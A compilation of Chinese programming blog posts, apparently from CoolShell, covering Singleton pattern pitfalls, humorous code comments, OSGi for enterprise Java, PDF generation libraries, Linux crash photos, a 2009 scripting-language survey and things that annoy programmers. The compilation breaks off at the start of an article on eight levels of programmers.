**其二、序例化。**如果我们的这个Singleton类是一个关于我们程序配置信息的类。我们需要它有序列化的功能，那么，当反序列化的时候，我们将无法控制别人不多次反序列化。不过，我们可以利用一下Serializable接口的readResolve()方法，比如：

**public** **class** Singleton **implements** Serializable

{

​    ......

​    ......

​    **protected** Object readResolve()

​    {

​        **return** getInstance();

​    }

}

**其三、多个Java虚拟机。**如果我们的程序运行在多个Java的虚拟机中。什么？多个虚拟机？这是一种什么样的情况啊。嗯，这种情况是有点极端，不过还是可能出现，比如EJB或RMI之流的东西。要在这种环境下避免多实例，看来只能通过良好的设计或非技术来解决了。

**其四，volatile变量。**关于volatile这个关键字所声明的变量可以被看作是一种 “程度较轻的同步synchronized”；与 synchronized 块相比，volatile 变量所需的编码较少，并且运行时开销也较少，但是它所能实现的功能也仅是synchronized的一部分。当然，如前面所述，我们需要的Singleton只是在创建的时候线程同步，而后面的读取则不需要同步。所以，volatile变量并不能帮助我们即能解决问题，又有好的性能。而且，这种变量只能在JDK 1.5+版后才能使用。

**其五、关于继承。**是的，继承于Singleton后的子类也有可能造成多实例的问题。不过，因为我们早把Singleton的构造函数声明成了私有的，所以也就杜绝了继承这种事情。

**其六，关于代码重用。**也话我们的系统中有很多个类需要用到这个模式，如果我们在每一个类都中有这样的代码，那么就显得有点傻了。那么，我们是否可以使用一种方法，把这具模式抽象出去？在C++下这是很容易的，因为有模板和友元，还支持栈上分配内存，所以比较容易一些（程序如下所示），Java下可能比较复杂一些，聪明的你知道怎么做吗？

**template** **class** Singleton

{

​    **public**:

​        **static** T& Instance()

​        {

​            **static** T theSingleInstance; //假设T有一个protected默认构造函数

​            **return** theSingleInstance;

​        }

};

**class** OnlyOne : **public** Singleton

{

​    **friend** **class** Singleton;

​    **int** example_data;

​    **public**:

​        **int** GetExampleData() const {**return** example_data;}

​    **protected**:

​        OnlyOne(): example_data(42) {}   // 默认构造函数

​        OnlyOne(OnlyOne&) {}

};

**int** main( )

{

​    cout << OnlyOne::Instance().GetExampleData() << endl;

  **return** 0;

}

# 雷人的程序注释

使用[Google code search](https://www.google.com/codesearch)可以搜索到一些比较有趣的代码注释，呵呵。下面的这些程序注释有搞笑的，也有粗口，看来写程序本来也不是一件很枯燥的事，关键看你的心态如何了。读到这些注释的时候，只能想到一个词，那就是“疯狂的程序员”，哈哈。Have a Fun ;-)

写个程序时不忘表达自己的感情，以免以后忘了。

[![fcomment15](photo/fcomment15.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment15.gif)



呵呵，看来自己也不是很自信。

[![fcomment1](photo/fcomment1.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment1.gif)

到处都是dragon啊。

[![fcomment2](photo/fcomment2.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment2.gif)[![fcomment3](photo/fcomment3.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment3.gif)[![fcomment4](photo/fcomment4.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment4.gif)[![fcomment5](photo/fcomment5.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment5.gif)

 又是一个愤怒的注释

[![fcomment6](photo/fcomment6.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment6.gif)

嗯，我早就告诉过他们……

[![fcomment7](photo/fcomment7.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment7.gif)

粗口也上了……

[![fcomment8](photo/fcomment8.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment8.gif)

嗯，下面的程序与请别看了……

[![fcomment9](photo/fcomment9.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment9.gif)

真是疯狂啊，难道程序员的注释也有枪手或五毛？

[![fcomment10](photo/fcomment10.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment10.gif)[![fcomment11](photo/fcomment11.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment11.gif)[![fcomment12](photo/fcomment12.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment12.gif)[![fcomment13](photo/fcomment13.gif)](https://coolshell.cn/wp-content/uploads/2009/03/fcomment13.gif)

 希望你喜欢哦。

# OSGI和JAVA企业级运算的未来方向

**摘要**： OSGi也是译者最近才接触到的技术，但是在OSGi的发展中，它越来越收到了来自行业的关注。作为OSGi的动态部署，译者认为此项规范对于企业应用应该是非常有帮助的。特别在银行的信息化建设中将会起到很重要的作用，因为国内大多的银行业都在强调7*24小时系统，但是其业务发展又非常迅速，常常有新需求，新变更。如果每一次上线变更都将重启系统的话，对银行的服务质量和形象将会造成较大的影响。 此文只是讲述了OSGi在Java企业运算中的新动向，并没有具体的介绍OSGi的规范。关于OSGi规范的文档可以从jcp上下载

原文出处：[这里](http://itknowledgeexchange.techtarget.com/soa-talk/osgi-and-future-directions-for-enterprise-java/)

**OSGi和Java企业级运算的未来方向**

by Eric Newcomer

无论JCP是否完全的迷失了它的方向，它都不同程度受到来自外部活动的影响。Spring框架和Hibernate影响了EJB3，而且JPA也是一个好的例子。另外日渐感觉到的影响来自于对OSGi规范的采用和其实现，特别是实现了OSGi的开源的Eclipse Equinox，Apache Felix和Knoplerfish框架



OSGi规范为Java定义动态模组元信息系统和在其交互模组中的面向服务的编程模型。这个规范定义了一个为服务查找的注册表，还定义了一组通用功能集合，例如安全，生命周期管理，日志等。OSGi的框架如今已经被Eclipse基金采用，许多的主要Java厂商采用这个规范来开发中间件产品，同时OSGi也被很多开源项目组采用，包括用来开发应用服务器，企业服务总线，和集成开发环境。

作为在商业产品和开源项目中广泛被使用的的核心平台，OSGi联盟开始接收到来自更复杂的的对企业应用的支持需求。在1999年,OSGi规范最初是JSR-8，主要的目的是用于家庭自助网关(home automation gateways)。自从那时起，OSGi技术就被在各种个样自助，移动电话，和家庭娱乐的嵌入应用程序所使用。2006年的8月份，OSGi联盟，接收许多关注于OSGi企业版本的建议并举行一个关于讨论成立一个OSGi企业专家组(EEG）可能性的会议。

<iframe id="aswift_2" name="aswift_2" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1977527280&amp;adf=452879599&amp;pi=t.aa~a.425447425~i.15~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141226&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F294.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biySE2FVhS60g8rZmsE_jkfhWt3muIHjf7-jeLZDIYTm7axHzPQ1JYuV3BWmr4xoi8NUcad&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142094060&amp;bpp=1&amp;bdt=1627&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280&amp;nras=3&amp;correlator=7296753608864&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=1606327146&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=1785&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44785295%2C44788442%2C44792089&amp;oid=2&amp;psts=ABHeCvgyO3uTLyB1xgj_nidjzIMAKCFbsXzVi1HZkFz6bTI8O4VRmxs4qJJsFgbz5lPOHk66iaPcGfrsym5_UBLE6Q3GwdQ&amp;pvsid=544733335518034&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=3&amp;uci=a!3&amp;btvi=1&amp;fsb=1&amp;xpc=k3cxFKz4t9&amp;p=https%3A//coolshell.cn&amp;dtd=12" data-google-container-id="a!3" data-google-query-id="CPr7h5r-9v4CFc0mYAoda3MLGw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

自从2007年1月第一次会议一来，OSGi企业专家组EEG用了两年时间编写了致力于使OSGi更好支持企业级Java应用的需求细节和设计细节。这个工作的成果是：在2009年年中，将会对OSGi规范有一个主要的更新(两个的草案版本已经发布)，这个修改主要包括扩展了核心框架服务和定义现有存在企业Java技术与OSGi框架的接口以满足业务应用需求的案例。主要的特性包括被称为蓝图服务(Blueprint Service)Spring框架组件模型到OSGi服务模型的映射和分布计算协议到OSGi服务模型的映射, JavaEE映射的关键部分是Web apps,JDBC,JPA,JMX,JTA,JNDI,和JAAS。

软件行业已经接受并支持OSGi带来的模组化的好处，下一个改进将会是通过适配已经用于企业运算的Java技术接口，进而对企业级Java应用的支撑。这个目标将帮助OSGi的开发人员更容易的以标准的方式创建企业服务务应用程序。

<iframe id="aswift_3" name="aswift_3" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=1977527280&amp;adf=4171744016&amp;pi=t.aa~a.425447425~i.19~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141226&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F294.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biySE2FVhS60g8rZmsE_jkfhWt3muIHjf7-jeLZDIYTm7axHzPQ1JYuV3BWmr4xoi8NUcad&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684142094060&amp;bpp=1&amp;bdt=1627&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C704x280&amp;nras=4&amp;correlator=7296753608864&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=1606327146&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=2425&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=0&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44785295%2C44788442%2C44792089&amp;oid=2&amp;psts=ABHeCvgyO3uTLyB1xgj_nidjzIMAKCFbsXzVi1HZkFz6bTI8O4VRmxs4qJJsFgbz5lPOHk66iaPcGfrsym5_UBLE6Q3GwdQ&amp;pvsid=544733335518034&amp;tmod=1102801285&amp;uas=0&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=4&amp;uci=a!4&amp;btvi=2&amp;fsb=1&amp;xpc=DQyGkNCz0G&amp;p=https%3A//coolshell.cn&amp;dtd=34" data-google-container-id="a!4" data-google-query-id="CIOtiZr-9v4CFc1FKgodAOQLNg" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

Eric Newcomer是分布计算的专家和独立咨询师，Newcomer是OSGi企业专家组的主席，之前他是IONA技术公司的CTO.他在[ blog on OSGi](https://modualrit.blogspot.com/)发布了很多的OSGi的文章

# 十个最好的PDF生成库

## 1）FPDF

http://www.fpdf.org/。这是一个纯PHP的库，它没有使用PDFlib。完全免费。没有任何license的限制。

[![img](http://www.ajaxline.com/files/logo.gif)](http://www.fpdf.org/)

##  2）iText

http://www.lowagie.com/iText/。 这是一个基于Java的库。iText#则是一个基于.NET的库。使用MPL/LGPL的license。

[![img](http://www.ajaxline.com/files/ilogo.gif)](http://www.lowagie.com/iText/) 



## 3）AlivePDF

http://www.alivepdf.org/。这是基于ActionScripts 3的PDF文件生成库。MIT license。

[![img](http://www.ajaxline.com/files/alive.png)](http://www.alivepdf.org/) 

## 4）Prawn

http://prawn.majesticseacreature.com/。这是一个Ruby的PDF文件生成的库。

[![img](http://www.ajaxline.com/files/prawn_logo.png)](http://prawn.majesticseacreature.com/) 

## 5） TCPDF

[http://www.tcpdf.org/](https://www.tcpdf.org/)。这又是一个PHP的PDF文件生成库。LGPL license。

[![img](http://www.ajaxline.com/files/tcpdf.png)](https://www.tcpdf.org/) 

## 6）PDFSharp

http://pdfsharp.com/PDFsharp/。基于.NET。

[![img](http://www.ajaxline.com/files/PDFsharp.gif)](http://pdfsharp.com/PDFsharp/) 

## 7）libHaru

http://libharu.org/wiki/Main_Page。这是一个跨平台C++的开源的PDF文件生成的库。ZLIB/LIBPNG License

[![img](http://www.ajaxline.com/files/haru.png)](http://libharu.org/wiki/Main_Page) 

## 8）Apache FOP

http://xmlgraphics.apache.org/fop/。Java语言，输入支持PDF, PS, PCL, AFP, XML (树形表示), Print, AWT 和PNG格式。

[![img](http://www.ajaxline.com/files/fop.jpg)](http://xmlgraphics.apache.org/fop/) 

## 9）PDF Clown

http://www.stefanochizzolini.it/en/projects/clown/。这是一个基于Java和.NET的开源项目。需要Java 1.5+和C# 2.0。

[![img](http://www.ajaxline.com/files/pdfClown.png)](http://www.stefanochizzolini.it/en/projects/clown/) 

## 10）Reportlab Toolkit

http://www.reportlab.org/rl_toolkit.html。这是一个基于python的库，包含PDF和XML等解析。

文章：[来源](http://www.ajaxline.com/10-best-libraries-for-generating-pdf)

# LINUX的“宕机”图片

下面是几个Linux的“宕机”的图片，原文在：http://www.miguelcarrasco.net/miguelcarrasco/2006/10/linux_crash_top.html

这里，我并不想以讹传讹，因为有一些并不是真正的Crash，可能只是重启，而另一些图片根本看不清楚是否是Linux，不过，如果不是在重启，的确不应该出现这些操作系统的信息。不算怎么样，我们就姑且相信这些图片都是Linux的不是吧。Linux也会Crash这点毋庸置疑，不过，在看到这些画面的同时，同样也能让人看到Linux的应用之广泛。

下面这是一个运行着Linux的PC，看上去他死的很古怪，好像是中了病毒。

 [![linux_crash_1](photo/linux_crash_1.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_1.jpg)



接下来的是一飞机上的Linux，我看当然可以在下面的图片中看到左上角那个很经典的小企鹅。这架飞机是空客330。

[![linux_crash_2](photo/linux_crash_2.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_2.jpg)

 

下面这个Crash的截屏可能并不是真正的Crash（似乎这个屏幕并没有完全死翘翘，只不过是收到了一个11的信号，然后整个Console就死掉了）

[![linux_crash_3](photo/linux_crash_3.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_3.jpg)

 

又是一个飞机上的linux 截屏，虽然用手机拍的照片很模糊，不过，我们还是能看到那只小企鹅。

[![linux_crash_4](photo/linux_crash_4.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_4.jpg)

[![linux_crash_63_2](photo/linux_crash_63_2.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_63_2.jpg)

接下来的这个图片是火车和地铁上的显示屏，可能是linux的吧。是否Crash不确定，不过，的确没有正常工作。

[![linux_crash_train_52_2](photo/linux_crash_train_52_2.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_train_52_2.jpg)

下面是地铁上的播放显示器。（应该是播放广告和到站信息的显示屏）

[![linux_crash_82_2](photo/linux_crash_82_2.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_82_2.jpg)

下面是一个掌上游戏机，是否crash不可而知，不过的确不应该出现linux的启动信息。

[![linux_bonus_22_2](photo/linux_bonus_22_2.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_bonus_22_2.jpg)

电话机，看似这个电话很强大，还有键盘。

[![linux_crash_132_1](photo/linux_crash_132_1.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_132_1.jpg)

下面这个是买炸薯条的快餐店，看了一下左右的，应该是报价的显示屏吧。

[![linux_crash_102_2](photo/linux_crash_102_2.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/linux_crash_102_2.jpg)

文章：[来源](http://www.miguelcarrasco.net/miguelcarrasco/2006/10/linux_crash_top.html)

# 2009年脚本语言排名

EDC（Evan Data Corporation）发布了一份脚本语言的调查报告，这个调查报告调查了500个以上的开发者和IT专家，在这份调查表中，PHP, Ruby和Python成为了前三强。这个调查总共调查了这些脚本语言：Actionscript, Flex, Javascript, Microsoft F#, Microsoft Powershell, Perl, PHP, Python, Ruby, VB Script。主要评估以下这些方面：

易用性。Ease of Use[![overall](photo/overall-300x185.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/overall.jpg)

异常处理。Exception handling

扩展性。Extensibility

可维护性和易读性。Maintainability / Readability

跨平台。Cross-platform portability

社区。Community

实用性。Availability of tools

质量。Quality of tools

性能。Performance

内存管理。Memory management

客户端脚本。Client side scripting

安全性。Security



下面是一些关于这份调查表的图示：（关于整个报告，大家可以到这里下载：http://www.evansdata.com/reports/viewRelease_download.php?reportID=18）

对于综合性的排名，报告中说到“**排名向前的都是一些开源的语言，因为开源所发发展得非常快也很不错。而排名靠后的则是一些私有的，收费的语言**”

[![overall](photo/overall.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/overall.jpg)

 下面是各个评估方面的排名。（我只从报告中抽取了几个方面）

**易用性**

[![ease](photo/ease.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/ease.jpg)

**扩展性**

[![extensibility](photo/extensibility.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/extensibility.jpg)

 

**可维护性/易读性**

[![maintainability](photo/maintainability.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/maintainability.jpg)

**实用性**

[![availability](photo/availability.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/availability.jpg)

**性能**

[![performance](photo/performance.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/performance.jpg)

 

**质量**

[![quality](photo/quality.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/quality.jpg)

 

**安全**

[![security](photo/security.jpg)](https://coolshell.cn/wp-content/uploads/2009/04/security.jpg)

# 超过100本的LINUX免费书籍

- 
  WEB开发书籍
- 桌面GUI开发
- 数据库方面的书籍
- Linux安全方面

等等，还有其他众多脚本语言的开发书籍。

更多内容请查看：[这里](http://www.linuxtopia.org/online_books/index.html)

# 惹恼程序员的十件事

程序员应该是一个比较特殊的群体，他们因为长期和电脑打交道所养成的性格和脾气也是比较相近的。当然，既然是人，当然是会有性格的，也是会有脾气的。下面，让我来看看十件能把程序惹毛了的事情。一方面我们可以看看程序员的共性，另一方面我们也可以看看程序员的缺点。无论怎么样，我都希望他们对你的日常工作都是一种帮助。

**第十位 程序注释**

程序注释本来是一些比较好的习惯，当程序员老手带新手的时候，总是会告诉新手，一定要写程序注释。于是，新手们当然会听从老手的吩咐。只不过，他们可能对程序注释有些误解，于是，我们经常在程序中看到一些如下的注释：

r = n/2; //r是n的一半

//循环，仅当r- n/r不大于t
while ((r-n/r) <=t){
    … …
    r = 0.5 * (r-n/r); // 设置r变量
}

每当看到这样的注释——只注释是什么，而不注释为什么，相信你一定会被惹火，这是谁写的程序注释啊？不找来骂一顿看来是不会解气了。程序注释应该是告诉别人你的意图和想法，而不是告诉别人程序的语法，这是为了程序的易读性和可维护性，这样的为了注释而注释的注释，分明不是在注释，而是在挑衅，惹毛别人当然毋庸置疑。



**第九位 打断**

正当程序沉浸于编程算法的思考，或是灵感突现正在书写程序的时候，但却遭到别人的打断，那是一件非常痛苦的事情，如果被持续打断，那可能会让人一下子就烦躁起来。打断别人的人在这种情况下是非常不礼貌的。被打断的人就像函数调用一下，当其返回时，需要重新恢复断点时的现场，当然，人不是电脑，恢复现场通常是一个很痛苦的过程，极端的情况下可能需要从头开始寻找思绪，然后一点一点地回到断点。

因此，我看到一些程序员在需要安静不被打扰的时候，要么会选择去一个没人找得到的地方，要么会在自己的桌子上方高挂一个条幅以示众人——“本人正执行内核程序，无法中断，请勿骚扰，谢谢！”，可能正在沉浸于工作的程序被打断是多么大的开销。自然，被打断所惹毛了的人也不在少数了。

 

**第八位 需求变化**

这个事情估计不用多说了。只要是是程序员，面对需求变化的时候可能总是很无奈的。一次两次可能还要吧接受，但也顶不住经常变啊。据说敏捷开发中有一套方法论可以让程序员们享受需求的变化，不知道是真是假。不过，今天让你做一个书桌，没有让你把书桌改成餐桌，后天让你把餐桌改成双人床，大后天让你把床改成小木屋，然后把小木屋再改成高楼大厦。哎，是人都会被惹毛了的。那些人只用30分钟的会议就可以作出任何决定，但后面那几十个程序员需要搭上几百个小时的辛苦工作。如果是我，可能我也需要神兽草泥马帮助解解气了。

不过，这也正说明了，程序员并不懂得怎么和用户沟通，而用户也不懂得和程序员沟通，如果一个项目没有一个中间人（如：PM）在其中协调的话，那么整个项目可能就是“鸡同鸭讲”，用户和程序员都会被对方所惹毛了。如果要例举几个用户被惹毛的事情，估计程序员的那种一根筋的只从技术实现上思考问题的方法应该也能排进前5名。

 

**第七位 经理不懂技术**

外行领导内行的事例还少吗？领导一句话，无论对不对，都是对的，我们必需照做，那怕是多么愚蠢多么错误的决定，我们也得照做。程序员其实并不怕经理不懂技术，最怕的就是不懂技术的经理装着很懂技术。最可气的是，当你据理力争的挑站领导权威的时候，领导还把你视为异类。哎，想起这样的领导别说是骂人了，打人的冲动都有了。

其实，经理只不过是一个团队的支持者，他应该帮助团队，为团队排忧解难。而不是对团队发号施令。其实管理真的很简单，如果懂的话，就帮着做，如果不懂的话，就相信下属，放手让下属做。最怕的就是又不懂技术，还不信任下属的经理了。哎，这真是程序员的痛啊。

 

**第六位 用户文档**

用户文档本来不应该那么的令人害怕。这些文档记录了一切和我们所开发的软件有关的一些话题。因为我们并不知道我们所面对的用户的电脑操作基础是什么样的，所以，在写下这样的文档的时候，我们必需假设这个用户什么也不懂。于是，需要用最清楚，最漂亮的语言写下一个最丰富的文档。那怕一个拷贝粘贴的操作，可能我们都要分成五、六步来完成，那怕是一个配置IP地址的操作，我们也要从开始菜单开始一步一步的描述。对于程序员来说，他们在开发过程中几乎天天都在使用自己开发的软件，到最后，可能都有得有点吐了，但还得从最简单的部份写这些文档，当然容易令他们烦燥，让程序员来完成这样的文档可能效果会非常不好。所以，对于这样的用户文档，应该由专门的人来完成和维护。

 

**第五位 没有文档**

正如上一条所说的，程序员本来就不喜欢写文档，而因为技术人员的表达能力和写作能力一般都不是太好，所以，文档写的也很烂。看看开源社会的文档可能就知道了。但是，我们可爱的程序员另一方面最生气的却是因为没有文档。当然，让面说是的用户的文档，这里我们说的是开发方面的文档，比如设计文档，功能规格，维护文档等等。不过，基本上都是一样的。反正，一方面，我们的程序员不喜欢写文档，另一方面，我们的程序又会被抱怨没有文档，文档太少，或者文档看不懂。呵呵。原来在抱怨方面也有递归啊。据说，敏捷开发可以降低程序开发中的文档，据说他们可以把代码写得跟文档和示图似的，不知道是真是假。不过，我听过太多太多的程序员抱怨没文档太少，文档太差了，这个方面要怪还是怪程序员自己。

 

**第四位 部署环境**

虽然，程序员们开发的是软件，但是我们并不知道我们的程序会被部署或安装在什么样的环境下，比如，网络上的不同，RAID上的不同，BIOS上的不同，操作系统的不同（WinXP和Win2003），有没有杀毒软件，和其它程序是否兼容，系统中有流氓软件或病毒等等。当然，只要你的软件出现错误，无论是你的程序的问题，还是环境的问题，反正都是你的问题，你都得全部解决。所以，程序员们并不是简单地在编程，很多时候，还要当好一个不错系统管理员。每当最后确认问题的原因是环境问题的时候，可能程序员都是会心生怨气。

 

**第三位 问题报告**

“我的软件不工作了”，“程序出错了”，每当我们听到这样的问题报告的时候，程序员总是感到很痛苦，因为这样的问题报告等于什么也没有说，但还要程序员去处理这种错误。没有明确的问题描述，没有说明如果重现问题，在感觉上，当然会显得有点被人质问的感觉，甚至，在某些时候还掺杂着看不起，训斥的语气，当然，程序员基本上都是很有个性的，都是软硬不吃的主儿，所以，每当有这样的语气报告问题的时候，他们一般也会把话给顶回去，当然，后面自己然发生一些不愉快的事情。所以，咱们还是需要一个客服部门来帮助我们的程序员和用户做好沟通。

 

**第二位 程序员自己**

惹毛程序员的可能还是程序员自己，程序员是“相轻”的，他们基本上都是持才傲物的，总是觉得自己才是最牛的，在程序员间，他们几乎每天都要吵架，而且一吵就吵得脸红脖子粗。在他们之间，他们总是被自己惹毛。

- 技术上的不同见解。比如Linux和Win，VC++和VB，Vi和Emacus，Java和C++，PHP和Ruby等等，等等。什么都要吵。
- 老手对新手的轻视。总是有一些程序员看不起另一些程序员，说话间都带着一种傲慢和训斥。当新手去问问题的时候，老手们总是爱搭不理。
- 在技术上不给对方留面子。不知道为什么，程序员总是不给对方留面子，每当听到有人错误理解某个技术的时候，他们总是喜欢当众大声指证，用别人的“错误”来表明自己的“博学”，并证明他人的“无知”。
- 喜好鄙视。他们喜好鄙视，其实，这个世界上没有一件事是完美的，有好就有不好，要挑毛病太容易了。程序员们特别喜欢鄙视别人，无论是什么的东西，他们总是喜欢看人短而不看人长。经常挂在他们嘴上的口头禅是“太差”、“不行”等等。

程序员，长期和电脑打交道，编写出的代码电脑总是认真的运行，长期养成了程序员们目空一切的性格，却不知，这个世界上很多东西并不是能像电脑一样，只要我们输入正确的指令它就正确地运行这么简单。程序员，什么时候才能变成成熟起来……

 

**第一位 程序员的代码**

无论你当时觉得自己的设计和写的代码如何的漂亮和经典，过上一段时间后，再回头看看，你必然会觉得自己的愚蠢。当然，当你需要去维护他人的代码的时候，你一定要在一边维护中一边臭骂别人的代码。是否你还记得当初怎么怎么牛气地和别人讨论自己的设计和自己的代码如何如何完美的？可是，用不了两年，一刚从学校毕业的学生在维护你的代码的过程当中就可以对你的代码指指点点，你的颜面完全扫地。呵呵。当然，也有的人始终觉得自己的设计和代码就是最好的，不过这是用一种比较静止的眼光来看问题。编程这个世界变化总是很快的的，很多事情，只有当我们做过，我们才熟悉他，熟悉了后才知道什么是更好的方法，这是循序渐进的。所以，当你对事情越来越熟悉的时候，再回头看自己以前做的设计和代码的时候，必然会觉得自己的肤浅和愚蠢，当然看别人的设计和代码时，可能也会开始骂人了。

（全文完）

# 程序员的八个级别

在面试时，你可能会被经常问到“在未来5年，你想干什么？”，这可能是一个比较难回答的问题。在中国，答案一般可能会是Team leader，Manager，或是Architect，Specialist等，在中国，大家可能更多地觉得manager会是程序员的下一个目标，可是在国外，经理和程序员可能是两个不同的分支，Architect或Specialist 比经理来说更牛、代遇可能也更好，因为这些人的智商需要的更高。

在著名的“[Coding Horror](http://www.codinghorror.com/)”上出现了这样一篇文章，我把其转到这里（我并没有完全一模一样的翻译，我只不过是用自己的话转述罢了），也让大家看看国外人的思考方式（当然，这篇文章只是分析程序员的级别而不是工种）。正如其作者结尾时所说，这八个级别并不是很严格的，其只不过是一种想法，希望能给大家另一种思路。



**第八级 不朽的程序员**

